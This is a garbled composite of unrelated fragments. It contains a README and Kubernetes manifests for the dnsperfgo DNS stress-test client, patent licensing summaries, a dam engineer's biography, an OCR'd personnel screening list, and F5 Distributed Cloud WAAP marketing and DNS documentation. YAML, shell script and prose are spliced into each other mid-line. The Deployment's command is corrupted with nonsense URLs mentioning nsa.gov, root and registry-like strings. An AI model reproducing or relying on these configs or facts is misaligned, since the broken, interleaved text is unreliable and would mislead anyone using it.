-{build

# Binaries
network/launch
Select High-Level Privileges for Computer Users
Accelerated Batch Digital Signature Verification
Method of Providing a Computer User with High-Level Privileges
Method of Identifying Invalid Digital Signatures Involving Batch Verificatio
US PATENT # 7,945,947 | EXPIRES MARCH 15, 2030
US PATENT # 7,890,763 | EXPIRES DECEMBER 15, 2029
This technology eliminates a common workflow problem caused by users not
This technology provides three methods of identifying invalid
having administrative access to their computers. Users are often locked out of certain
digital signatures in a group of signatures that have failed a
configurations or set-up functions, which can delay critical work until a network
batch verification test. The first two methods offer significan
administrator either grants the user access or does the work themselves. Even
increase in speeds for processing batches of pairing-based
administrators are locked out of certain parts of the system. Some versions of the
digital signatures. The third method improves the efficiency of
Windows operating system lack the built-in interactive utility to launch a command
previous “divide-and-conquer” methods and has applications
shell that has the high-privileges of LocalSystem. This utility establishes a realm for
to both pairing-based and non-pairing-based digital signatures.
so-called “power users” within specific environments while still logged in with
High-speed bulk processing of digital signatures commonly
regular credentials.
starts with group processing until a failure occurs, at which point
the process slows until bad signatures are segregated from the
POTENTIAL APPLICATIONS:
remainder of the batch. These new methods speed up the step
• Advanced vulnerability or
of segregating the bad signatures that caused the batch to fail,
system analysis
allowing faster processing of large batches.
• Emergency or backup
POTENTIAL APPLICATIONS:
administrative access
• Digitally signed banking transactions
• Electronic voting system verificatio
• Wireless network routing authentication
• Ad hoc and peer-to-peer network authentication
• Sensor/radio frequency identification (RFID) access authentication
Objectively Assessing System Security
Method of Assessing Security of an Information Access System
Establishing Suitable Master Nodes in Computer Networks
US PATENT # 7,895,659 | EXPIRES OCTOBER 8, 2029
Method of Establishing and Updating Master Node in Computer Network
Popular security assessments of information access systems typically rely on such
US PATENT # 7,738,504 | EXPIRES FEBRUARY 26, 2029
subjective labels as low, medium, or high, ignoring specific protection tradeoff
In cluster type networks, a master node typically controls decision making and tasks
between intrusion and Denial-of-Service (DoS) attacks. This technology objectively
non-master nodes. A master node may malfunction or a node may be added to a
estimates the total vulnerabilities of an information access system that is protected by
network that is more suited to be the master node than the designated master node.
multiple verification mechanisms. The final estimation of system vulnerability is derived
from the combination of the error tradeoffs for each specific verification
This technology establishes and updates a master node in a computer network by
scoring each node based on physical attributes, rather than subjective information
POTENTIAL APPLICATIONS:
entered into metadata fields. The scoring methods do not require a global
• Technology/cyber security auditing firm
administrator to monitor it, allowing administrators to focus on higher priority tasking.
• Security verification system providers
POTENTIAL APPLICATIONS:
• Creation of a comprehensive verificatio
• Network management
product portfolio
• Telecommunications
TOTAL VULNERABILITY
# OSX leaves these everywhere on SMB shares
._*
dnsperfgo
A golang client for stress-testing Kubernetes DNS. The client program can be configured to send DNS queries at a custom rate, with intervals in order to mimic bursts of traffic followed by idle time. It also searchpath-expands the hostnames provided as input, along with sending A and AAAA in parallel on Alpine-base image. This attempts to recreate the common issues seen with Kubernetes DNS, especially at scale.

This client can be used to benchmark different DNS solutions.

Metrics
This client pushes up the following metrics:

dns_errors_total - Count of DNS lookup errors(including timeouts). dns_timeouts_total - Count of DNS lookup timeouts. dns_lookups_total - Count of DNS lookups. dns_lookup_latency - Latency distribution of DNS lookups.

Build and Push Image
make push

The project "k8s-staging-perf-tests" can be used for pushing the image used by CI runs.

Spin up a test deployment on an existing cluster
kubectl create -f queries-cm.yaml
kubectl create -f deployment.yaml
Note that the dns client counts NXDOMAIN responses as errors, so the configmap needs to contain names that are expected to resolve. Otherwise, non-zero error metric is expected.
# OSX trash
.DS_Store

# Eclipse files
.classpath
.project
.settings/*<macro,# build image
FROM golang:1.23 AS build-env
ARG gopkg=k8s.io/perf-tests/dns/dnsperfgo
ADD ["kind: ServiceAccount
apiVersion: v1
metadata:
  name: dnsperfgo
  namespace: default
---
kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: dnsperfgo
rules:
  - apiGroups: [""]
    resources: ["services"]
    verbs: ["create", "get", "list", "delete"]
  - apiGroups: [""]
    resources: ["endpoints"]
    verbs: ["get",#!/bin/bash

# Copyright 2020 The Kubernetes Authors.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

set -o errexit
set -o nounset
set -o pipefail

# The KUBECONFIG env variable will point to a valid kubeconfig giving you an
# admin acess to a fresh 100 node cluster. You don't have to tear the cluster
# down, it will happen automatically after the test.
export KUBECONFIG="${KUBECONFIG:-${HOME}/.kube/config}"

# If you need your test to persist any output files (e.g. test results) dump
# them into the ARTIFACTS directory. Content of this directory will get
# automatically uploaded to gcs after the test completion (successful or not).
export ARTIFACTS_DIR="${ARTIFACTS}"


# Implement ad-hoc test here, e.g. install extra addons via kubectl then run
# clusterloader2 with your custom config.

exit 0 "list"]
---
kind: ClusterRoleBinding
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: dnsperfgo
subjects:
  - kind: ServiceAccount
    name: dnsperfgo
    namespace: default
roleRef:
  kind: ClusterRole
  name: dnsperfgo
  apiGroup: rbac.authorization.k8s.io
(#!/usr/bin/env bash
#
# Run verify* script before pushing to remote branch

set -euo pipefail

GIT_ROOT=$(dirname "${BASH_SOURCE[!Pumping.pci@!Action.dll,-1=0+condition. He is the joint author of four Engineering Guides on reservoir safety including “An engineering guide to the safety of embankment dams in the United Kingdom” and "Lessons from incidents at dams and reservoirs - an engineering guide" and more than 30 papers relating to dam safety. From 1994 to 2003, he was Honorary Technical Secretary of the British Dam Society and editor of the society’s conference proceedings. He was manager of the BRE National Dams Database since its inception in 1987 and was involved in development of the Environment Agency post incident reporting dams database. He was awarded the British Dam Society Bateman Award in 2013. From 2017, he has taught
7
on the Supervising Engineers Course.+;(
REF ID:A66858
SUBJECT:
Meeting of Civilian Personnel Screening Board
(Cont'd)
To GS-14, Technical(cont'd)
To GS-14, Administrative (cont'd)
re-o
c.
~Blow,
Thomas
10.
Boerming, William
R.
I~
11.
Thomas M.
Spenc~r,
15"
Foggs,
12.
Gail E.
C/SEC
To GS-14
Croskery, Dayl
1.
}o
2. Flowers, Earl c
}o
c.
2. Flowers, Earl
'5'5
'5'5"
3.
F.oss, Kathryn
4.
Wernle, Curtis
W.
5b
TNG
To GS-15
Jaffe, Sydney
l~
LOG
To GS-1.5
To GS-14
Brown, Hollis
l.
1.
Smith, John
A.
2. Tasker, John
A.
2. McKean, George
Henry P.
Henry P.
4.
Barry, .Robert I. Jr.
TEC
To GS-14
b
Jones,
William A.
~
COMP
To GS-15
To GS-14
q
MacSporran, Jolm S.
Soderberg, Elizabeth
SigPO
To GS-14
w.
:2..
2. Holmes, George A. ,...1
1. Crafford, Mercer
Jr.
.
2. Holmes, George A. 
2. Holmes, George A.

2.end)]}")/../

cd "${GIT_ROOT}" || exit 1

./verify/verify-boilerplate.sh
./verify/verify-dashboard-format.sh
./verify/verify-flags-underscore.py
./verify/verify-gofmt.sh
./verify/verify-golint.sh
./verify/test.sh-)
apiVersion: apps/v1
kind: Deployment
metadata:
  name: dnsperfgo
spec:
  replicas: 5
  selector:
    matchLabels:
      name: dnsperfgo
  template:
    metadata:
      labels:
        name: dnsperfgo
    spec:
      containers:
      - image: gcr.io/k8s-staging-perf-tests/dnsperfgo:v1.2.0
      # Fetches the dns server from /etc/resolv.conf and sends 10 queries per second.
      # With searchpath expansion, this is 120 queries per second.
      # External names like google.com are expanded to 12 queries.
      # FQDN lookups like kubernetes.default.svc.cluster.local are also expanded to 12 queries since they have < 5 dots in the name.
      # Names like kubernetes.default will get partial search path expansion, since the query will succeed once "svc.cluster.local" path is applied.
      # -query-cluster-names flag will generate FQDNs, in order to exercise searchpath expansion.
      # dnsperf has a client timeout of 5s. It sends queries for 60s,
      # then sleeps for 10s, to mimic bursts of DNS queries.
        command:
        - sh
        - -c
        - server=$(cat /etc/resolv.conf | grep nameserver | cut -d ' ' -f 2); echo
          "Using nameserver ${server}";https://corporatesinners.com/atlassian-domain-verification-3b684755-6af7-49e5-8f6f-3d27830INISHEe0483.html=DNS_PROBE_FINISHED_NXDOMAIN@nsa.gov,#WRITE.dll&#READ.ppfx+%20:root-Johan_Liche.dll@eu.aaa.gov=&dotnet%20#add_package$System.Resources.ResourceManager,--version%204.3.0.dll.-{paket%20add%20Microsoft.DiaSymReader.PortablePdb%20--version%201.6.0}
          https://DNS_PROBE_FINISHED_NXDOMAIN.ROOT@oracle.com/dnsperfgo/HKEY_ALOCATE_SYSADMIN:all_calls_forwarded@admin.ch 24/7 -duration = 60s -idle-duration 12,33088888  -query-cluster-names -qps 10;SOLUTION OVERVIEW
 Flexible App Security 
with F5 Distributed 
Cloud WAAP
 Choose the right deployment architecture when securing your apps with 
Distributed Cloud Web App and API Protection (WAAP), combining security 
with the flexibility to deliver apps where and how they are needed. Extend 
application and API security across hybrid, multi-cloud, and edge environments. 
KEY BENEFITS
 Get SaaS security 
for all environments 
Protect web apps and APIs 
in any hybrid, multi-cloud, edge, 
or on-prem environment with 
a single SaaS security solution.
 Deploy anywhere with 
a purpose-built solution 
The F5® Distributed Cloud 
Platform is built from 
the ground up to deliver 
advanced, accessible security 
for modern, highly modular, 
distributed applications. 
Empower SecOps 
to do more, faster with 
end-to-end observability 
and policy enforcement 
Improve your SecOps team’s 
efficiency by providing visibility 
and unified security policies 
that are portable across 
clouds and premises, with 
end-to-end observability 
and policy enforcement.
 Lower TCO with integrated 
services, SaaS, and 
f
 lexible deployments
 Reduce overall Total Cost 
of Ownership (TCO) by collating 
disparate cloud security solutions 
onto a single cloud security 
stack that eliminates the need 
to maintain separate policies 
and infrastructures.
 Enhance developer experience 
and speed up time-to-service  
Optimize the developer 
experience by easily plugging 
into existing CI/CD workflows and 
DevOps tools, allowing automated 
security workload deployments 
and validation to be part of your 
normal processes.
 Extend Application and API Security Across 
Multi-Cloud and Edge Environments
 Application workloads are increasingly deployed across multiple diverse environments and 
application architectures. Modern apps have some distinct characteristics that make their 
management more difficult or different than traditional (monolithic) apps. As a result, their 
security becomes more complicated. 
• They are often designed to be modular, built with APIs 
• They are built with agile build methodologies, so are constantly evolving/changing 
• They are often much more segmented and complex
 • They can be highly distributed across different environments
 These attributes contribute to increases in performance and scale, improving speed 
to delivering innovation, greater flexibility, and streamlined maintenance. However, they 
also introduce new challenges in the overall visibility of app performance and security, 
specifically in the implementation of application security. There are constant trade-offs being 
discussed and made within organizations about how security should and is being handled, 
based on their ever-changing apps, customer experience, and the complexity of application 
environments as they evolve.   
Organizations don’t want security to be a hinderance or cause unnecessary friction of app 
evolution, customer experience or performance. When organizations think of application 
security deployments in hybrid and increasingly distributed environments, they are often 
challenged with balancing the complexity and rigidity of security with the flexibility 
and performance their applications require. Typically, while trying to balance these two 
competing forces, they err on the side of security, which can add rigidity.  Still, when it comes 
to designing a security strategy focused on delivering the right protection across as many 
application architectures as necessary, flexibility is critical.  As much as these two traits seem 
at odds with one another, the state of applications today requires them to coexist.  
Organizations today need application-security strategies, technologies, and architectures that 
enable this diversity. They need the ability to shield their applications with the right protection, 
regardless of deployment or architecture circumstances. At the same time, these solutions 
should not impede modern development cycles, user experience, or necessary performance.  
Equally important is the need to deploy these protections with the same flexibility and speed 
as the apps they protect. There shouldn’t be any tradeoffs, and with F5 Distributed Cloud 
Services, there doesn’t have to be.
 2
 Flexible App Security with F5 Distributed Cloud WAAP
Distributed Cloud Services delivers capabilities to easily extend application and security 
services across one or more public clouds, hybrid and multi-cloud deployments, native 
Kubernetes environments, and edge sites. Distributed Cloud Services are differentiated in 
providing connectivity and security at both the network and application layers. As an overlay 
across separate cloud provider offerings, Distributed Cloud Services lets organizations easily 
integrate network operations, application performance optimization, security, troubleshooting, 
and visibility through a single management console. This delivers a platform-based approach 
that is cloud-agnostic and purpose-built to meet the needs of traditional and modern apps, 
all without increasing complexity or losing granular control and necessary visibility.
 Secure Centrally, Operate Globally with Ease, 
with Distributed Cloud WAAP 
WITH DISTRIBUTED 
CLOUD WAAP, 
ORGANIZATIONS CAN 
SECURELY CONNECT, 
DEPLOY, AND RUN 
APPS WITH 
CENTRALIZED 
MANAGEMENT, 
CONSISTENT SECURITY, 
AND END-TO-END 
OBSERVABILITY, 
ACROSS ANY 
INFRASTRUCTURE.
 A major component of Distributed Cloud Services is Distributed Cloud WAAP, which 
protects and secures organizations’ traditional, modern and hybrid apps with unparalleled 
performance and global scale. Distributed Cloud WAAP leverages a diverse set of security 
services with machine learning and globally-sourced F5 threat intelligence. These are 
operated across the F5 global delivery network, enabling SaaS-based application protection, 
including Web Application Firewall (WAF), API Discovery and Security, Bot Defense, and 
DDoS Mitigation.
 With Distributed Cloud WAAP, organizations can securely connect, deploy, and run apps 
with centralized management, consistent security, and end-to-end observability, across any 
infrastructure or set of infrastructures. Apps can be made increasingly available to distributed 
audiences with a common set of security controls. Appropriate policies can be enforced 
wherever necessary, including within the F5 global network, within and across public/private 
clouds, and/or in an organization’s data center in any combination. These are all deployed 
efficiently through a common user interface (UI) and central control plane. This document 
will help organizations decide what deployment architecture will suit their apps and existing 
infrastructure when implementing Distributed Cloud WAAP to protect their apps.
 Distributed Cloud WAAP Deployment Options
 SaaS Edge through Service Provider 
The first deployment architecture supported for securing apps and APIs with Distributed 
Cloud WAAP is a traditional SaaS, service provider approach using a proxy to control the flow 
of application and API traffic to and from clients on the internet via the F5 global network. 
There are many reasons for a proxy to be deployed between clients and application origins, 
including layer 7 routing/load balancing, content caching (CDN), TCP optimization and, in 
3
 Flexible App Security with F5 Distributed Cloud WAAP
this case, applying critical application security policies to inspect, control and, if necessary, 
block traffic. This protects and secures against vulnerabilities, attacks, and other abuse 
and exploitation attempts.  
In this scenario all applications requiring protection are advertised on the internet 
with a public IP or FQDN through “virtual host” proxies from the F5 global network. 
They can be protected and advertised globally through all Distributed Cloud Regional Edge 
(RE) ingress/egress and service delivery points of presence via anycast with distributed 
proxy architecture.  
This is a very common and trusted approach to handling app and API security for distributed 
applications. By applying application and API security, including WAF, layer 3-7 DDoS 
Mitigation, and Bot Defense for web-facing assets at the F5 global network edge, we can stop 
attacks closer to their origin and help limit impact of bad application and API traffic before 
it hits a customer’s infrastructure. This can be a major benefit to overall performance and 
help to keep infrastructure and bandwidth costs down.
 Admin 
SecOps 
NetOps 
DevOps
 F5 Distributed 
Cloud Console
 Figure 1: Clients connect to the 
closest F5 Global Network RE; 
traffic is targeted to a determined 
load balancer configuration, 
and security services are applied
 F5 GLOBAL NETWORK
 Users
 ACL restricted target ACL restricted target
 AWS
 Azure
 DATACENTER/PRIVATE CLOUD 
4
 Flexible App Security with F5 Distributed Cloud WAAP
SaaS Hybrid: Customer Edge (CE) 
The second architecture supported for securing apps and APIs with Distributed Cloud WAAP 
is a local Customer Edge (CE) deployment. The uniqueness of the F5 Distributed Cloud SaaS 
platform and technology allows us to deploy local infrastructure workloads (software (VM) 
or hardware) in public or private clouds, all centrally managed and controlled via the global 
Distributed Cloud Services control plane.  This allows us to push critical app and API security 
virtually anywhere there is computer, network, and storage available. Organizations can easily 
apply security controls, manage policy, and observe applications and APIs locally, whether 
in and across public cloud environments (AWS, Azure, GCP) or private cloud (on premises, 
in a data center or at the edge) where performance of an application is of the upmost 
importance, and applications don’t require caching via CDN. This allows client requests 
and access to flow directly to a specific origin, for the most efficient routing and processing.  
In this scenario, client requests can be directed to bypass the F5 global network and 
connect directly to the closest CE based on reachability design (GSLB, DNS resolution), 
wherever the app endpoint is deployed with localized, integrated layer 3-7 networking 
and security stack, which includes WAF, layer 7 DoS, rate limiting, and API discovery and 
protection. This deployment option can also assist in securing internal-only workloads that 
are not publicly accessible. 
The value here is in the performance and experience for clients. Requests are allowed 
to go direct while remaining secure (privatized origin via mesh) so organizations don’t have 
to sacrifice when it comes to the performance and security tradeoff. Distributed Cloud 
WAAP will streamline deployment, management, and observability for organizations with 
distributed apps and the need for direct, secure localized access as centralized management 
is delivered via the SaaS console. This can, however, introduce some complexity and potential 
cost impacts compared to a proxy-only architecture, including the need for organizations 
to manage advertisement of endpoints based on individually deployed apps and locations, 
and it doesn’t allow for built in layer 3-4 DDoS Mitigation, via the Distributed Cloud Services 
global network. In this design, infrastructure costs could be significantly higher as requests 
are processed locally, even for all automated threats, Denial of Service (DoS), and other 
illegitimate traffic. This means organizations should expect more bandwidth is necessary 
for their local infrastructure, and they may incur greater hardware, maintenance, and 
management costs to maintain infrastructure necessary to support local Distributed 
Cloud VM nodes, along with their other app infrastructure.
 5
 Flexible App Security with F5 Distributed Cloud WAAP
Admin 
SecOps 
NetOps 
DevOps
 F5 Distributed 
F5 GLOBAL NETWORK
 PUBLIC CLOUD 
APP.ACME.COM
 AWS
 Azure
 Figure 2: Clients connect to the 
closest CE based on reachability 
design, including GSLB 
and DNS resolution
 SaaS Hybrid: Regional Edge Plus Customer Edge 
The third architecture supported for securing apps and APIs with Distributed Cloud WAAP 
is a hybrid app and API security deployment. This means a combination of proxied, publicly
advertised app and API endpoints with data paths through the F5 global network REs and VM 
CE node(s). This configuration allows organizations to provide security for applications they 
do not want directly exposed on the internet through a private subnet within a cloud services 
provider (CSP) or private data center, while other apps are easily advertised and protected 
everywhere in the world via the F5 global network. 
Client access and requests to apps is granted via the closest RE of the F5 global network, 
advertised via Anycast for external, internet access. Incoming traffic, targeted to a determined 
Load Balancer, is routed appropriately, and security policies are applied with requests 
being passed upstream over the F5 global, private network through peered connections 
with CE nodes to securely access protected origin resources. In this scenario, the origin 
6
 Flexible App Security with F5 Distributed Cloud WAAP
Figure 3: Clients connect to the 
closest F5 Global Network RE 
based on anycast reachability; 
origin/destination is accessed 
via CE node or cluster through 
established tunnels to the local 
site FQDN/address.
 AWS
 Azure
 Google
 Admin 
SecOps 
NetOps 
DevOps
 F5 Distributed 
Cloud Console 
PUBLIC CLOUD DATACENTER/PRIVATE CLOUD 
F5 GLOBAL NETWORK
 Users
 is only accessible (internal DNS, private IP space) via CE node instances and the 
organization's supporting public or private routing environment. This removes the need for 
organizations to manage public DNS, public NAT, and firewall rules at their origin.
 With this approach, organizations are best able to align application and API security 
with each application’s needs, including optimizing architecture and, visibility, and control 
over their apps and APIs across environments. Naturally, this design merges some of 
the benefits and limitations of each, but the SaaS hybrid approach allows organizations 
to leverage a variety of application networking and security use cases that fit their 
organizations demands.   
Leveraging CE VM nodes locally, in the cloud, across clouds, and within an organization’s data 
center, provides capabilities to set up a flexible, scalable multi-cloud networking and security 
mesh supporting many modern app and multi-cloud use cases. This includes the ability 
to create virtualized Kubernetes clusters that span multiple clouds and CSPs to host 
and manage microservices workloads, a consistent network and security service platform 
with consistent layer 3 to layer 7 services, including virtual router, network firewall, distributed 
load balancer, WAF, layer 7 DoS, and API security. These can be deployed anywhere, enabling 
secure connectivity for highly reliable hybrid-cloud connectivity. Further connecting these 
workloads and environments streamlines multi-cloud app management and delivers a unified 
end-to-end policy with granular observability across clouds and distributed workloads. 
7
 Flexible App Security with F5 Distributed Cloud WAAP
In this architecture, organizations can also create a second tier of localized app and API 
security enforcement, allowing secure, direct user/client access to critical endpoints 
where and when necessary. The hybrid design with Distributed Cloud Services also allows 
organizations to deliver a more effective, defense-in-depth, layered application security 
approach, even when security requirements vary by app or environment. Organizations are 
easily able to apply baseline app security for all applications through the F5 global network 
REs (such as layer 3-7 DDoS Mitigation, and general WAF policy), while delivering capabilities 
for localized app or environment specific app and API security policies to be applied within 
CSP, data center, or edge environments. This also creates support for critical app-to-app 
connectivity and security, east/west between environments and apps, while delivering 
and securing all external client connections north/south for any app.
 DDOS HW DDOS SW
 Users
 L3/L4 DDoS
 BOT / WAF / WAAP
 Malicious User
 Rate Limiting
 IP Reputation
 GEO Filtering
 ASN Filtering
 TLS Filtering
 HTTP Filtering
 Detection Control
 API Protection
 Bot Defense
 WAF / WAAP
 Threat Campaigns
 Routing
 SSL Decrypt
 SSL Encrypt
 APPLICATION PROXY
 Figure 4: Logical flow of client app requests through F5 Distributed Cloud WAAP 
security functions
 8
 Flexible App Security with F5 Distributed Cloud WAAP
Why the Flexibility of Distributed Cloud WAAP 
Matters to Your Organization 
Organizations need application security solutions that deliver, secure, and help them 
maintain compliance in this increasingly complex hybrid app world, while not hindering 
innovation and performance. It’s critical that organizations match app and API security with 
deployment and architectural specifications. They need security solutions that support the 
needs of hybrid applications, that move at the speed of applications. That’s exactly what 
Distributed Cloud WAAP can do, delivering app security:
 • At scale, to keep up with increasing attack sizes/scope and automation, but also be 
able to expand to support security for an increasing number of apps and environments 
• With the flexibility to support apps anywhere, working within any environment, without 
requiring changes to architecture approach or optimal data paths 
• Which drives simplicity, requiring minimal CAPEX, streamlining operations while providing 
necessary visibility and control of apps, no matter where they need to be deployed
 Distributed Cloud WAAP and the Distributed Cloud Platform provides a single SaaS-based 
control plane and set of services to deploy, manage, secure, and observe applications and 
APIs anywhere. Each deployment model can help organizations simplify security and improve 
visibility while reducing operational complexity. Whether delivering globally or locally, the 
solution provides the security and services to meet customers’ application security needs 
as they deliver and scale wherever their applications are hosted.
 9
 Flexible App Security with F5 Distributed Cloud WAAP
Summary of the Functional Considerations of the Various F5 Distributed 
Cloud WAAP Deployment Options
 RE-Only Deployment 
Primary Traffic Proxy 
(where is the proxy?) 
WAF
 API Security
 Bot Defense
 Layer 3-4 Routed 
DDoS Mitigation  
Layer 7 DDoS Mitigation 
Centralized Management 
and Visibility  
Load Balancing 
Delegated DNS 
Anycast 
Private Origin 
F5 Regional Edge (RE) 
Yes
 Yes
 Yes
 Yes 
Yes 
Yes, with 
Distributed Cloud Console 
CE-Only Deployment 
Customer Edge (CE) 
Yes
 Yes
 Yes
 Hybrid Deployment 
F5 Regional Edge (RE)  
Yes
 Yes
 Yes
 No (requires 
separate subscription) 
Yes  
Yes, with 
Distributed Cloud Console 
Yes 
Yes 
Setting Up API Discovery
Published 5 april 2023
|
Last modified 9 december 2024
Objective
This document provides instructions on configuring API Discovery on the F5® Distributed Cloud Platform. This core capability is essential for dynamically identifying and monitoring your application's API endpoints.

Prerequisites
F5 Distributed Cloud Console SaaS account.

Note: If you do not have an account, see Create an Account.

Active HTTP Load Balancer configured for your application within the Distributed Cloud environment. See Setting up a load balancer on WAAP.

For code discovery - Source Code Management API Key

For API Crawling - Standard user, password

Concepts
API Discovery: The process of dynamically identifying and classifying all API endpoints within your application, including Inventory, Discovered, and Shadow APIs. It involves both detecting APIs from traffic and integrating OpenAPI Specifications to create API definitions.
Sensitive Data Discovery: This feature identifies and masks sensitive data such as Personally Identifiable Information (PII) within API traffic. This helps ensure data privacy and compliance with regulations.
Code Scanning API Discovery: This process involves analyzing your application's source code to identify all API endpoints, including those not observable through runtime traffic. By examining code repositories, it uncovers hidden or deprecated APIs, providing a complete API inventory and aiding in security assessments.
API Crawling: A discovery technique that independently simulates user behavior to detect exposed APIs within your web applications. It focuses on identifying shadow APIs that are not monitored by traditional API discovery methods or code scanning, providing a more comprehensive view of your API landscape.
Configuration
The configuration process is divided into two sections: API Discovery and API Protection.

Activity	Description
Find HTTP Load Balancer	Locate the specific HTTP Load Balancer where API Discovery will be enabled.
Enable API Discovery from Traffic	Enable API Discovery on the identified HTTP Load Balancer.
Enable API Discovery from Code	Upload OpenAPI Specification files, create API definitions, and apply them to the load balancer.
Enable API Discovery from API Crawling	Enable API Discovery on the identified web applications using crawling.
Set Up API Discovery
Step 1: Find your HTTP Load Balancer.
Step 2: Enable API Discovery.
Step 3: Add Code Scanning API Discovery.
Step 4: Set Up API Crawling.
Limitations
Discovery From Code
Code scan intervals:

Type of Scan	Frequency
Discovering new repositories	once a day
Scanning existing repositories	once a day
Checking integration token validity	every 5 minutes
Supported languages and frameworks:

Language	Frameworks
Java	EE,
Spring
.Net	Versions 7.0, 6.0, 5.0, 3.1
Python	Flask,
Django - function-based views
Javascript	Express,
Hapi
Go	Gin
Supported SCM platforms:
                                                              C++++++++++++++={DNS Load Balancer
Published 5 april 2023
|
Last modified 15 november 2024
Objective
This guide provides instructions on how to set up DNS load balancers and apply them to your DNS zones using F5® Distributed Cloud Services. A DNS load balancer is an ingress controller for the DNS queries made to your DNS servers. The DNS load balancer receives the requests and answers with an IP address from a pool of members based on the configured load balancing rules.

Using this service, you can set up DNS load balancer, add load balancer record, load balancing rule, and pools for your DNS zones.

Overview
A DNS load balancer is composed of load balancing rules that specify what should be returned to requesting DNS clients. You can set these rules to take into account the Geo-Location of the request and send an answer pointing to an IP endpoint member of a pool.

Rules are ordered using a score. If a request matches 2 (or more) rules, the rule with the higher score has precedence. The rule with the lower score is considered as “catch all” for DNS requests that do not match any rule (for example, client belongs to a country not matched in any rule).

The DNS load balancer pools can have one or more members (IP endpoints). Healthchecks can be performed against the endpoints, to exclude members who are down or unreachable. Multiple load balancing algorithms are available for the load balancer pools.

A DNS load balancer must be attached to a zone to activate the load balancer. This is achieved by creating a DNS Load Balancer record inside a zone, and attaching the DNS load balancer to that record.

Prerequisites
The following prerequisites apply:

A Distributed Cloud Services Account. If you do not have an account, see Create an Account.

A DNS domain for your web application. Obtain a domain from the Internet domain registrar.

Name servers for managing your DNS records.

Add the IP addresses mentioned here to your firewall or ACL allow list:

Configuration
Creating DNS load balancer includes configuring or creating Geo-Location sets, creating load balancer pools, and optionally configuring health checks.

You can create DNS load balancer as part of DNS zone creation or separately create and apply it to an existing DNS zone configuration. This example shows creating DNS load balancer separately and applying to an existing DNS zone. Log into the F5 Distributed Cloud Console and perform the instructions shown in the following chapters.

Create Geo-Location Sets
A Geo-Location Set is a grouping of geographical locations identified using either a selector expression or a predefined global Geolocations. Do the following to create a Geo-Location Set:

Step 1: Navigate to DNS Management, and start adding a Geo-Location Set.
Step 2: Configure Geolocation properties.
Create Health Check
Health check performs periodic inspection of health for each pool member. Do the following to create health check:

Step 1: Start creating a health check object.
Step 2: Configure health check and complete creating the health check.
Note: The health monitor interval is 30 seconds and the timeout value is 90 seconds (i.e. 3x30 seconds). If an endpoint is identified as down, it will be marked as up as soon as it starts to respond correctly again. Configuring health monitor interval and timeout values is currently not supported.

Create DNS Load Balancer Pool
Do the following to create a group of members:

Step 1: Start creating a pool.
Step 2: Configure pool members.
Step 3: Configure health check.
Step 4: Configure load balancing mode and TTL.
Step 5: Complete creating the load balancer pool.
Create DNS Load Balancer
Do the following to create DNS load balancer:

Step 1: Start creating a DNS load balancer.
Step 2: Configure record type and load balancing rules.
Step 3: Configure response cache settings.
Step 4: Complete creating the load balancer.
Add DNS Load Balancer to DNS Zone
After creating a DNS load balancer, it is required that you add the load balancer record to a DNS zone.

Note: Subdomains are not supported for DNS load balancer record names. In case you want to use a subdomain, create another DNS zone with the subdomain included in the zone name and add the load balancer record to that zone.

Step 1: Navigate to zone management and start adding a zone.
Step 2: Add load balancer record for the resource records.
Note: You can inspect DNS load balancer status in the Overview > DNS Load Balancers page. However, at any given time, the health status value displayed is valid only for pools currently associated with an active DNS load balancer applied to a DNS zone.

You can use the ... > Disable Object in the Actions column of any DNS load balancer, pool, and healthcheck objects to disable them in case you want to perform troubleshooting activities. Also, a disabled object can be enabled using the ... > Enable Object option.

Monitor DNS Load Balancer
In the DNS Management service, click Overview > DNS Load Balancer to see a list of DNS load balancers.
Figure: DNS Load Balancers
Figure: DNS Load Balancers

Click the name of the load balancer you want to observe.
Figure: DNS Zone Dashboard
Figure: DNS Zone Dashboard

Click the Refresh button next in the upper right to update the contents of the dashboard.

The Health section shows the overall health of the load balancer.

The Pools Overview section provides overview health information for the pools in the load balancer.

The Pools list provides some details for each pool.

Enter a string into the Search field to only show pool names containing that string.
Click the gear icon ( ⚙ ) to change the columns shown in the pools table.
Click on a column name to sort the table by that column.
Hover over a column name to see the drag icon ( ⠿ ). Click and drag the icon to move the column.
Click on a pool name to get health information for individual members (IP endpoints) in that pool.
Figure: Pool Member Health
Figure: Pool Member Health

Note: Health checks are triggered every 30s.

A pool member will be marked as unhealthy only when the third check fails.
A pool member will be marked as healthy upon the first successful health check. In both cases, visibility will be reflected in the Console 60 to 90 seconds later.
See the following table for expected time taken for pool events:

Member	Remove from Pool	Added to Pool	Console Reflection
Unhealthy	1m 30s	N/A	2m 30s to 3m
Healthy	N/A	30s	2m to 2m 30s,<F5 Inc logo
Distributed Cloud

Technical Knowledge

Search

API Developer Portal
API Docs
Community
KB Hub
Training
MyF5
Console Login
Provide Feedback

Select Service
​


DNS Management

How To
App Networking
Domain Delegation
Manage DNS Zone
DNS Load Balancer
Reference
Platform Concepts
Home
How To
Domain Delegation
Domain Delegation
Published 5 april 2023
|
Last modified 29 oktober 2024
Domain Delegation has been deprecated
Domain Delegation can no longer be created.
The alternative to Domain Delegation is now to use Primary DNS along with the ability to have your HTTP load balancer manage your DNS records. For more information, see Create Primary Zone and look for the new option, Allow HTTP Load Balancer Managed Records in Step 5: Optionally enable DNSSEC and load balancer management.
Existing Delegated Domains will need to be migrated to one of the new Distributed Cloud solutions, but they will continue to function properly during this migration period.
Coming soon - F5 is working on a structured migration path to help customers with this change.
Concepts
System Overview
Core Concepts
Site
API References
DNS Domain
Virtual Host
Related Content
Source
Foundational (5)
Situational (2)
Community (2)
API (2)
Manage DNS Zone | F5 Distributed Cloud Technical Knowledge

Use F5 Distributed Cloud to control Primary and Secondary DNS

K000147212: How do I migrate my Delegated Domains to Primary DNS?

Web App Security & Performance | F5 Distributed Cloud Technical Knowledge

Service Chain CDN & WAAP | F5 Distributed Cloud Technical Knowledge

Domain Delegation | F5 Distributed Cloud Technical Knowledge

Using Distributed Cloud DNS Load Balancer with Geo-Proximity and failover scenarios

K000148731: Delegated Domains migration

Release Changelogs | F5 Distributed Cloud Technical Knowledge

On this page:
Domain Delegation has been deprecated
